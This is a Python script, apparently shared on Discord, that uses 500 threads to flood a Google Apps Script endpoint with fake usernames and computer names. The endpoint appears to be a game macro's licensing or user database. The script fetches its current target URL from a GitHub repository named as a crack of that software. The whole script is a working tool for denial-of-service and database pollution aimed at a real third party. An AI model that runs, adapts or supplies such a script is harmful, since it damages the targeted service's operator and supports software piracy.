import requests
import urllib.parse
import os
import random
import string
import threading
import time

print("script made by msgpack on discord")

def INDIAUP(length=5):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

# Global variable to hold the current script URL
current_script_url = "https://script.google.com/macros/s/AKfycbyaY3CJTgG2ZV3HxY6d30K3t-PAhJKCVeJU9RSAziSoAmxBiWhY06ATUVDQJ2z39S_-/exec"

def update_script_url():
    global current_script_url
    while True:
        try:
            response = requests.get("https://raw.githubusercontent.com/pomsaddons/Virage-Grow-A-Garden-Macro-Premium-Crack/refs/heads/main/SpamDBScript/CurrentDBLink.txt")
            if response.status_code == 200:
                current_script_url = response.text.strip()
        except Exception:
            pass
        time.sleep(60)

def boom():
    global current_script_url
    while True:
        if not current_script_url:
            time.sleep(1)
            continue
        username = f"FillTheDbUP_{INDIAUP()}"
        compName = f"CRACKEDLMAO_{INDIAUP()}"
        encodedUser = urllib.parse.quote(username)
        encodedPC = urllib.parse.quote(compName)
        fullURL = f"{current_script_url}?username={encodedUser}&computer={encodedPC}"
        try:
            response = requests.get(fullURL)
            if response.status_code == 200:
                print("done", response.text)
        except Exception:
            pass

def sigmarizzler(num_threads=10):
    threads = []

    # Start the URL updater in a separate thread
    updater_thread = threading.Thread(target=update_script_url, daemon=True)
    updater_thread.start()

    for _ in range(num_threads):
        thread = threading.Thread(target=boom)
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()

sigmarizzler(500)
